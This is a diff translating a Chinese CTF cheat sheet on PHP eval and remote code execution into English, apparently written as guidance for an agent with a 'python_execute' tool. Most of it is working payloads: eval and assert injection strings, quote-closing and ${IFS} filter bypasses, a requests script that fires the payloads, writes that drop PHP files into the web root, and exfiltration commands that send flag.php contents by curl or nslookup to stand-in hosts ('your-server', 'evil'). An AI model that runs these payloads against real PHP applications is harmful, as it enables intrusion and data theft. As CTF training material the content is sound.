@@ -1,20 +1,20 @@
-# eval 与 RCE 技巧大全
+# Comprehensive eval and RCE Techniques
 
-## PHP 代码执行函数对比
+## Comparison of PHP Code Execution Functions
 
-| 函数 | 回显 | 用法 |
+| Function | Echo | Usage |
 |------|------|------|
-| `system($cmd)` | **有**（直接输出到 stdout） | `system("id")` → 直接在页面看到结果 |
-| `passthru($cmd)` | **有**（原始二进制输出） | `passthru("cat flag.php")` |
-| `exec($cmd, $out)` | **无**（存入 `$out` 数组） | `exec("id", $out); print_r($out)` |
-| `shell_exec($cmd)` | **无**（返回字符串） | `echo shell_exec("id")` |
-| `` `$cmd` `` | **无**（等价于 shell_exec） | `` echo `id` `` |
-| `popen($cmd, 'r')` | **无**（需 fread） | `$h=popen("id","r");echo fread($h,1024)` |
-| `eval($code)` | 取决于代码 | `eval("system('id');")` → 有回显 |
+| `system($cmd)` | **Yes** (writes directly to stdout) | `system("id")` → result shown directly on the page |
+| `passthru($cmd)` | **Yes** (raw binary output) | `passthru("cat flag.php")` |
+| `exec($cmd, $out)` | **No** (stored in the `$out` array) | `exec("id", $out); print_r($out)` |
+| `shell_exec($cmd)` | **No** (returns a string) | `echo shell_exec("id")` |
+| `` `$cmd` `` | **No** (equivalent to shell_exec) | `` echo `id` `` |
+| `popen($cmd, 'r')` | **No** (requires fread) | `$h=popen("id","r");echo fread($h,1024)` |
+| `eval($code)` | Depends on the code | `eval("system('id');")` → echoes |
 
-## highlight_file 与 eval 输出顺序
+## highlight_file and eval Output Order
 
-这是 CTF 中常见的陷阱：
+This is a common trap in CTFs:
 
 ```php
 <?php
@@ -23,104 +23,104 @@ eval($_GET['cmd']);
 ?>
 ```
 
-**关键理解**：
-- `highlight_file()` 输出源码高亮 → 这是第一步
-- `eval()` 中的 `system()` 输出 → 这是第二步
-- 两者在**同一个 HTTP 响应**中，命令结果在源码高亮**之后**
-- `system()` 的输出是直接写入 stdout 的，**不会被 highlight_file "挡住"**
+**Key understanding**:
+- `highlight_file()` outputs the highlighted source → this is step one
+- The output of `system()` inside `eval()` → this is step two
+- Both are in the **same HTTP response**, with the command result **after** the highlighted source
+- The output of `system()` is written directly to stdout and is **not "blocked" by highlight_file**
 
-**搜索 flag 的方法**：
-- 在 HTTP 响应的**末尾**查找 flag
-- `highlight_file` 的 HTML 输出很长，flag 通常在最末尾
-- 使用 `python_execute` 解析响应，只看最后几百字符
+**How to find the flag**:
+- Look for the flag at the **end** of the HTTP response
+- The HTML output of `highlight_file` is very long; the flag is usually at the very end
+- Use `python_execute` to parse the response and look only at the last few hundred characters
 
 ```python
 import requests
 r = requests.get(url, params={"cmd": "system('cat flag.php');"})
-# flag 在 r.text 的末尾，不在源码高亮部分
-print(r.text[-500:])  # 只看最后 500 字符
+# The flag is at the end of r.text, not in the highlighted-source part
+print(r.text[-500:])  # Look only at the last 500 characters
 ```
 
-## eval 绕过技巧
+## eval Bypass Techniques
 
-### 1. 分号绕过
+### 1. Semicolon Bypass
 
 ```php
-// 如果 eval 需要分号但输入被过滤
-eval($_GET['cmd']);  // 正常用法
-// 传入: system('id')  // 不需要加分号，eval 会自动加
-// 或传入: system('id');// 
+// If eval requires a semicolon but the input is filtered
+eval($_GET['cmd']);  // Normal usage
+// Pass: system('id')  // No semicolon needed, eval adds it automatically
+// Or pass: system('id');// 
 ```
 
-### 2. PHP 闭合标签
+### 2. PHP Closing Tag
 
 ```php
-// 如果 eval 内容被包裹
+// If the eval content is wrapped
 eval("echo '" . $_GET['cmd'] . "';");
-// 传入: ');system('id');//
-// 结果: eval("echo '');system('id');//';");
+// Pass: ');system('id');//
+// Result: eval("echo '');system('id');//';");
 ```
 
-### 3. assert() 注入
+### 3. assert() Injection
 
 ```php
-// assert() 在 PHP 7 前可以执行代码
+// assert() could execute code before PHP 7
 assert("system('id')");  // PHP < 7.x
-// PHP 7+ assert 变成语言结构，不再执行字符串
+// In PHP 7+ assert became a language construct and no longer executes strings
 ```
 
-### 4. preg_replace /e 修饰符
+### 4. preg_replace /e Modifier
 
 ```php
-// PHP < 7.0 的 preg_replace /e 会执行替换结果
+// In PHP < 7.0, preg_replace /e executes the replacement result
 preg_replace('/test/e', 'system("id")', 'test');
-// 任意正则 + /e + 可控替换字符串 → RCE
+// Arbitrary regex + /e + controllable replacement string → RCE
 ```
 
-## 无回显 RCE 利用
+## Exploiting RCE Without Echo
 
-### 方法 1：写文件到 Web 目录
+### Method 1: Write a file to the web directory
 ```bash
 system("cat flag.php > /var/www/html/x.txt");
-# 然后访问 http://target/x.txt
+# Then visit http://target/x.txt
 ```
 
-### 方法 2：DNS/HTTP 外带
+### Method 2: DNS/HTTP exfiltration
 ```bash
 system("curl http://your-server/$(cat flag.php | base64)");
 system("nslookup $(cat flag.php).your-server.com");
 ```
 
-### 方法 3：写入 PHP 文件再读
+### Method 3: Write a PHP file and read it
 ```bash
 system("echo '<?php echo file_get_contents(\"/flag\"); ?>' > /var/www/html/read.php");
-# 然后访问 http://target/read.php
+# Then visit http://target/read.php
 ```
 
-### 方法 4：环境变量 + 另一个漏洞
+### Method 4: Environment variable + another vulnerability
 ```bash
-# 将结果写入 cookie/session
+# Write the result into a cookie/session
 system("export FLAG=$(cat flag.php)");
-# 通过 phpinfo() 或 /proc/self/environ 读取
+# Read it via phpinfo() or /proc/self/environ
 ```
 
-## PHP 代码执行链构造
+## Building PHP Code Execution Chains
 
-### 从简单到复杂的利用链
+### Exploitation chains from simple to complex
 
-1. **直接执行**：`system("id")` → 有回显
-2. **无回显写文件**：`system("cat flag.php > /var/www/html/x")`
-3. **无回显外带**：`system("curl http://evil/$(cat flag.php)")`
-4. **无回显盲注**：`system("if [ $(cat flag.php | head -c1) = N ]; then sleep 3; fi")`
+1. **Direct execution**: `system("id")` → echoes
+2. **No echo, write to file**: `system("cat flag.php > /var/www/html/x")`
+3. **No echo, exfiltrate**: `system("curl http://evil/$(cat flag.php)")`
+4. **No echo, blind injection**: `system("if [ $(cat flag.php | head -c1) = N ]; then sleep 3; fi")`
 
-### 常见 CTF eval 场景
+### Common CTF eval Scenarios
 
-| 场景 | 代码模式 | 绕过方法 |
+| Scenario | Code pattern | Bypass method |
 |------|---------|---------|
-| 简单 eval | `eval($_GET['cmd'])` | `system('cat flag.php')` |
-| eval + 过滤空格 | `eval($cmd)` + 空格被替换 | `system('cat${IFS}flag.php')` |
-| eval + 过滤关键字 | `eval($cmd)` + flag 被替换 | `system('cat${IFS}/f*')` |
-| eval + highlight_file | `highlight_file + eval` | 看**页面末尾** |
-| eval + 长度限制 | `strlen($cmd) > N` | 使用变量/短函数名 |
-| assert 注入 | `assert($_GET['cmd'])` | PHP < 7: `system('id')` |
-| preg_replace /e | `preg_replace('/./e', ...)` | 替换字符串中注入代码 |
+| Simple eval | `eval($_GET['cmd'])` | `system('cat flag.php')` |
+| eval + space filter | `eval($cmd)` + spaces replaced | `system('cat${IFS}flag.php')` |
+| eval + keyword filter | `eval($cmd)` + flag replaced | `system('cat${IFS}/f*')` |
+| eval + highlight_file | `highlight_file + eval` | Look at the **end of the page** |
+| eval + length limit | `strlen($cmd) > N` | Use variables / short function names |
+| assert injection | `assert($_GET['cmd'])` | PHP < 7: `system('id')` |
+| preg_replace /e | `preg_replace('/./e', ...)` | Inject code in the replacement string |
